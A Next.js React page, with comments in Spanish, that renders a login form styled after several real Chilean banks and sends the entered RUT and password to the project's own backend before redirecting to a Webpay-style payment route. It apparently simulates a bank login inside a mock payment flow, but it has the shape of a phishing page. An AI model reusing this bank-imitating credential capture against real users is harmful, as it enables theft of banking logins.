// Página en blanco sencilla
'use client';
import API_CONFIG from "@/config/api";
import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";

// Bancos
const bancoEstado = {
  nombre: "BancoEstado",
  mensajeBienvenida: 'Ingresa a tu Banca en Línea',
  color: '#3e50b4',
  logo: '/img/bancos/logo-bancoestado.png',
  mensajeProblemaClave: '¿Problemas con tu clave?'
}
const bancoChile = {
  nombre: "Banco de Chile",
  mensajeBienvenida: 'Bienvenido a tu Banca en Línea',
  color: '#0a1861',
  logo: '/img/bancos/logo-bancochile.png',
  mensajeProblemaClave: '¿Problemas con tu clave? Recupérala'
}
const bancoFalabella = {
  nombre: "Banco Falabella",
  mensajeBienvenida: 'Ingresa a tu Banca en Línea',
  color: '#3b9326',
  logo: '/img/bancos/logo-bancofalabella.png',
  mensajeProblemaClave: '¿Problemas con tu clave? Haz clic aquí.'
}
const bancoBCI = {
  nombre: "Banco BCI",
  mensajeBienvenida: 'Ingresa a tu Banco en Línea',
  color: '#28892b',
  logo: '/img/bancos/logo-bancobci.png',
  mensajeProblemaClave: '¿Problemas con tu clave?'
}
const bancoSantander = {
  nombre: "Banco Santander",
  mensajeBienvenida: 'Ingresa a tu banco en línea',
  color: '#e50000',
  logo: '/img/bancos/logo-bancosantander.png',
  mensajeProblemaClave: '¿Problemas con tu clave?'
}

// Mapeo para seleccionar el objeto banco según el string recibido
const bancosMap: Record<string, typeof bancoEstado> = {
  bancoEstado,
  bancoChile,
  bancoFalabella,
  bancoBCI,
  bancoSantander,
};

function formatearRut(rut: string) {
  // Eliminar todo lo que no sea número o K/k
  rut = rut.replace(/[^0-9kK]/g, '').toUpperCase();
  if (rut.length === 0) return '';
  // Separar cuerpo y dígito verificador
  let cuerpo = rut.slice(0, -1);
  let dv = rut.slice(-1);
  // Agregar puntos cada 3 dígitos
  cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
  return cuerpo.length ? `${cuerpo}-${dv}` : dv;
}

export default function LoginBancoPage() {
  const router = useRouter();
  // Estado para el banco seleccionado, por ahora está definido estáticamente
  const [selectedBank, setSelectedBank] = useState(bancoEstado);
  const [numTarjeta, setNumTarjeta] = useState('');
  const [tipoTarjeta, setTipoTarjeta] = useState<"crédito" | "débito">("crédito");
  const [rut, setRut] = useState('');
  const [contrasena, setContrasena] = useState('');
  const [error, setError] = useState('');

  // Setear banco seleccionado desde sessionStorage
  useEffect(() => {
    const bancoGuardado = sessionStorage.getItem('banco');
    if (bancoGuardado && bancosMap[bancoGuardado]) {
      setSelectedBank(bancosMap[bancoGuardado]);
    }
  }, []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError('');
    try {
      // Limpiar el RUT antes de enviarlo (eliminar puntos y guión)
      const rutLimpio = rut.replace(/[.]/g, '');
      
      const res = await fetch(`${API_CONFIG.TGR}login_tarjeta/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          rut: rutLimpio,
          contrasena
        }),
      });
      if (!res.ok) throw new Error('Credenciales incorrectas');
      const data = await res.json();
      if (data && data.user_info) {
        sessionStorage.setItem('user_info', JSON.stringify(data.user_info));
        // Redirigir o mostrar éxito según tu flujo
        router.push('/webpay/pago-banco');
      } else {
        setError('Respuesta inesperada del servidor');
      }
    } catch (err: any) {
      setError(err.message || 'Error al iniciar sesión');
    }
  }

  return (
    <div
      style={{
        fontFamily: 'Arial, sans-serif',
        minHeight: '100vh',
        backgroundColor: '#f5f5f5',
        padding: '20px',
        alignSelf: 'center',
        alignContent: 'center',
        width: '100%',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center'
      }}
    >
      {/* Login Card */}
      <div className="card-like p-4 m-4 row" style={{ maxWidth: '500px', margin: 'auto', borderRadius: '30px', boxShadow: '0 4px 8px rgba(0,0,0,0.1)' }}>
        <div className="col p-4 mx-4">
          {/* Logo banco */}
          <div className="text-center mb-4 d-flex justify-content-center">
            <img src={selectedBank.logo} alt={`Logo ${selectedBank.nombre}`} style={{ maxHeight: '50px' }} />
          </div>
          {/* Mensaje de bienvenida */}
          <p className="text-center mb-5" style={{ fontSize: '1.25rem' }}>{selectedBank.mensajeBienvenida}</p>
          {/* Formulario de login */}
          <form className="" style={{ maxWidth: '350px', margin: 'auto' }} onSubmit={handleSubmit}>
            <div className="mb-4">
              <label htmlFor="rut" className="form-label">RUT</label>
              <input
                type="text"
                className="form-control"
                id="rut"
                value={rut}
                onChange={e => {
                  // Eliminar puntos y guión antes de formatear para evitar duplicados
                  const limpio = e.target.value.replace(/[.\-]/g, '');
                  setRut(formatearRut(limpio));
                }}
                style={{
                  borderRadius: '10px',
                  border: '1px solid #ccc',
                  padding: '10px',
                  fontSize: '1rem',
                  height: '3rem'
                }}
                placeholder="Ingresa tu RUT"
                required
              />
            </div>
            <div className="mb-5">
              <label htmlFor="password" className="form-label">Clave</label>
              <input
                type="password"
                className="form-control"
                id="password"
                value={contrasena}
                onChange={e => setContrasena(e.target.value)}
                style={{
                  borderRadius: '10px',
                  border: '1px solid #ccc',
                  padding: '10px',
                  fontSize: '1rem',
                  height: '3rem'
                }}
                placeholder="Ingresa tu clave"
                required
              />
            </div>
            {error && (
              <div className="alert alert-danger py-2 text-center" style={{ borderRadius: 10, fontSize: '0.95rem' }}>
                {error}
              </div>
            )}
            <div className="d-flex justify-content-center">
              <button type="submit" style={{ backgroundColor: selectedBank.color, color: 'white', borderRadius: '30px', width: '75%', height: '3rem' }}>Ingresar</button>
            </div>
          </form>
          {/* Mensaje de problema con clave */}
          <div className="text-center mt-3">
            <a href="#" style={{ color: selectedBank.color, textDecoration: 'none' }}>{selectedBank.mensajeProblemaClave}</a>
          </div>
        </div>
      </div>
    </div>
  );
}